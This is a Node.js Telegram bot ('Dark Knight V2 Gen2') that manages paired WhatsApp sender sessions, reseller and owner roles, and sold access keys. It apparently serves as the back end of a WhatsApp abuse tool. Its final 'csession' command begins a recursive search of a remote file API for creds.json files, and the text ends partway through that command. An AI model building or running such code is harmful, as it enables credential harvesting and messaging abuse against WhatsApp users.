const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch"); // pastikan sudah install node-fetch
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
//const { InlineKeyboard } = require("grammy");
const { spawn } = require('child_process');
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
fetchLatestWaWebVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageTag,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay
} = require("@whiskeysockets/baileys");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const userEvents = new Map(); // Map untuk menyimpan event streams per user
let userApiBug = null;
let sock;


function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 📂 Loaded ${sessionCount} sessions from ${Object.keys(data).length} users`);
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    // Reset file jika corrupt
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 💾 Saved ${sessionCount} sessions for ${Object.keys(data).length} users`);
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}

// Function untuk mengirim event ke user
function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}
// === Command: Add Reseller ===
bot.command("addreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addreseller <id>");

  const data = loadAkses();
  if (data.resellers.includes(id)) return ctx.reply("✗ Already a reseller.");

  data.resellers.push(id);
  saveAkses(data);
  ctx.reply(`✓ Reseller added: ${id}`);
});

bot.command("delreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delreseller <id>");

  const data = loadAkses();
  data.resellers = data.resellers.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Reseller removed: ${id}`);
});

// === Command: Add PT ===
bot.command("addpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addpt <id>");

  const data = loadAkses();
  if (data.pts.includes(id)) return ctx.reply("✗ Already PT.");

  data.pts.push(id);
  saveAkses(data);
  ctx.reply(`✓ PT added: ${id}`);
});

bot.command("delpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delpt <id>");

  const data = loadAkses();
  data.pts = data.pts.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ PT removed: ${id}`);
});

// === Command: Add Moderator ===
bot.command("addmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addmod <id>");

  const data = loadAkses();
  if (data.moderators.includes(id)) return ctx.reply("✗ Already Moderator.");

  data.moderators.push(id);
  saveAkses(data);
  ctx.reply(`✓ Moderator added: ${id}`);
});

bot.command("delmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delmod <id>");

  const data = loadAkses();
  data.moderators = data.moderators.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Moderator removed: ${id}`);
});

// ==================== AUTO RELOAD SESSIONS ON STARTUP ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }
  
  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();
  
  // Check hasil setelah 30 detik
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);
    
    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
    }
  }, 30000);
}

// FUNCTION SANGAT SIMPLE
function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found - waiting for users to add senders');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing user: ${username} with ${numbers.length} senders`);
    
    numbers.forEach(number => {
      totalProcessed++;
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      // Cek apakah session files ada
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);
        
        connectToWhatsAppUser(username, number, sessionDir)
          .then(sock => {
            successCount++;
            console.log(`✅ Successfully reconnected: ${number}`);
          })
          .catch(err => {
            console.log(`❌ Failed to reconnect ${number}: ${err.message}`);
          });
      } else {
        console.log(`⚠️ No session files found for ${number}, skipping`);
      }
    });
  }
  
  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions reconnected`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);
    
    // Kirim event connecting
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    // ✅ GUNAKAN LOGGER YANG SILENT
    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode);

          // ❌ HAPUS DARI sessions MAP KETIKA TERPUTUS
          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            sendEventToUser(username, {
              type: 'status',
              message: 'Mencoba menyambung kembali...',
              number: BotNumber,
              status: 'reconnecting'
            });
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          // ✅ SIMPAN SOCKET KE sessions MAP GLOBAL - INI YANG PENTING!
          sessions.set(BotNumber, userSock);
          
          // ✅ KIRIM EVENT SUCCESS KE WEB
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });
          
          // ✅ SIMPAN KE USER SESSIONS
          const userSessions = loadUserSessions();
  if (!userSessions[username]) {
    userSessions[username] = [];
  }
  if (!userSessions[username].includes(BotNumber)) {
    userSessions[username].push(BotNumber);
    saveUserSessions(userSessions);
    console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
  }
          
          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });
          
          // Generate pairing code jika belum ada credentials
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            // Tunggu sebentar sebelum request pairing code
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });
                
                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);
                
                // KIRIM KODE PAIRING KE WEB INTERFACE
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });
                
              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        // Tampilkan QR code jika ada
        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);
      
      // Timeout after 120 seconds
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error', 
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";

  const teks = `
<blockquote>🍁 Dark Knight V2 Gen2</blockquote>
<i>Now Dark Knight has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>〢「 Information 」</blockquote>
<b>Developer : @kyu_pedo</b>
<b>Version   : 2 Gen2 ⧸ <code>II</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  // PERBAIKAN: Konsisten dengan nama tombol
  const keyboard = Markup.keyboard([
    // Baris 1
    ["🔑 Create Menu", "🔐 Access Menu"],
    // Baris 2  
    ["ℹ️ Bot Info", "💬 Chat"],
    // Baris 3
    ["📢 Channel", "🌐 Web Interface"]
  ])
  .resize()
  .oneTime(false);

  await ctx.reply(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

// PERBAIKAN: Handler yang benar untuk tombol reply keyboard
bot.hears("🔑 Create Menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 Dark Knight V2 Gen2</blockquote>
<i>These are some settings menu</i>

<b>🔑 Create Menu</b>
• /connect
• /listsender
• /delsender
• /addkey
• /listkey
• /delkey
`;

  // Kirim pesan baru dengan inline keyboard untuk back
  await ctx.reply(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("DEVELOPER", "https://t.me/kyu_pedo") ]
    ]).reply_markup
  });
});

bot.hears("🔐 Access Menu", async (ctx) => {
  const accessMenu = `
<blockquote>🍁 Dark Knight V2 Gen2</blockquote>
<i>This is the menu to take user access</i>

<b>🔐 Access Menu</b>
• /addacces
• /delacces
• /addowner
• /delowner
• /addreseller
• /delreseller
• /addpt
• /delpt
• /addmod
• /delmod
`;

  await ctx.reply(accessMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("DEVELOPER", "https://t.me/kyu_pedo") ]
    ]).reply_markup
  });
});

bot.hears("ℹ️ Bot Info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>Dark Knight V2 Gen2</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @kyu_pedo for assistance
`;

  await ctx.reply(infoText, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("DEVELOPER", "https://t.me/kyu_pedo") ]
    ]).reply_markup
  });
});

bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/kyu_pedo");
});

bot.hears("📢 Channel", (ctx) => {
  ctx.reply("📢 Channel updates: https://t.me/About_Kyu");
});

bot.hears("🌐 Web Interface", (ctx) => {
  ctx.reply("🌐 Akses web interface di: http://your-domain.com (Bacot kontol gw bingung ini)");
});

// Handler untuk inline keyboard (tetap seperti semula)
bot.action("show_indictive_menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 Dark Knight V2 Gen2</blockquote>
<i>These are some settings menu</i>

<b>🔑 Create Menu</b>
• /connect
• /listsender
• /delsender
• /addkey
• /listkey
• /delkey
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("DEVELOPER", "https://t.me/kyu_pedo") ]
  ]);

  await ctx.editMessageText(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_access_menu", async (ctx) => {
  const accessMenu = `
<blockquote>🍁 Dark Knight V2 Gen2</blockquote>
<i>This is the menu to take user access</i>

<b>🔑 Access Menu</b>
• /addacces
• /delacces
• /addowner
• /delowner
• /addreseller
• /delreseller
• /addpt
• /delpt
• /addmod
• /delmod
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("DEVELOPER", "https://t.me/kyu_pedo") ]
  ]);

  await ctx.editMessageText(accessMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_bot_info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>Dark Knight V2 Gen2</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @kyu_pedo for assistance
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("DEVELOPER", "https://t.me/kyu_pedo") ]
  ]);

  await ctx.editMessageText(infoText, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("back_to_main", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";
  
  const teks = `
<blockquote>🍁 Dark Knight V2 Gen2</blockquote>
<i>Now Dark Knight has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>〢「 Information 」</blockquote>
<b>Developer : @kyu_pedo</b>
<b>Version   : 2 Gen2⧸ <code>II</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    ["🔑 Create Menu", "🔐 Access Menu"],
    ["ℹ️ Bot Info", "💬 Chat"],
    ["📢 Channel", "🔄 Update Proxies"]
  ])
  .resize()
  .oneTime(false);

  // Edit pesan yang ada untuk kembali ke menu utama
  await ctx.editMessageText(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// command apalah terserah
bot.command("sessions", (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessions = sessions.size;
  
  let message = `📊 **Session Status**\n\n`;
  message += `**Active Sessions:** ${activeSessions}\n`;
  message += `**Registered Users:** ${Object.keys(userSessions).length}\n\n`;
  
  Object.entries(userSessions).forEach(([username, numbers]) => {
    message += `**${username}:** ${numbers.length} sender(s)\n`;
    numbers.forEach(number => {
      const isActive = sessions.has(number);
      message += `  - ${number} ${isActive ? '✅' : '❌'}\n`;
    });
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("addkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini\n\nExample :\n• /addkey kyu,1d\n• /addkey kyu,1d,aii", { parse_mode: "HTML" });
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const customKey = parts[2] ? parts[2].trim() : null;

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✓ <b>Key berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `𞅏 𝑨𝒄𝒕𝒊𝒗𝒆 𝑲𝒆𝒚 𝑳𝒊𝒔𝒕:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey kyu");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 7837260212", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            // simpan ke file sementara
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath); // hapus file setelah dikirim
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});

// CSessions - improved, defensive, auto-detect creds.json
// Requirements (must exist in scope): axios, fs, path, ownerIds (array), sessionPath(fn), connectToWhatsApp(fn), bot (telegraf instance)
bot.command("csession", async (ctx) => {
  // -- CONFIG --
  const DEBUG_CS = false;            // set true untuk melihat log panjang
  const SEND_TO_CALLER = false;      // kalau mau juga kirim hasil ke pemanggil set true
  const REQUEST_DELAY_MS = 250;      // jeda antar request ke API (hindari rate-limit)
  const MAX_DEPTH = 12;              // batas rekursi (safety)
  const MAX_SEND_TEXT = 3500;        // batas chars saat kirim isi JSON ke Telegram

  // -- util --
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  function isDirectory(item) {
    if (!item) return false;
    const a = item.attributes || {};
    const checks = [
      a.type, a.mode, item.type, item.mode,
      a.is_directory, a.isDir, a.directory,
      item.is_directory, item.isDir, item.directory
    ];
    for (let c of checks) {
      if (typeof c === "string") {
        const lc = c.toLowerCase();
        if (lc === "dir" || lc === "directory" || lc === "d") return true;
        if (lc === "file" || lc === "f") return false;
      }
      if (c === true) return true;
      if (c === false) return false;
    }
    return false; // fallback: treat as file unless explicit
  }

  function normalizeDir(dir) {
    if (!dir) return "/";
    let d = String(dir).replace(/\/+/g, "/");
    if (!d.startsWith("/")) d = "/" + d;
    if (d.length > 1 && d.endsWith("/")) d = d.slice(0, -1);
    return d;
  }

  function extractNameAndMaybeFullPath(item) {
    const a = item.attributes || {};
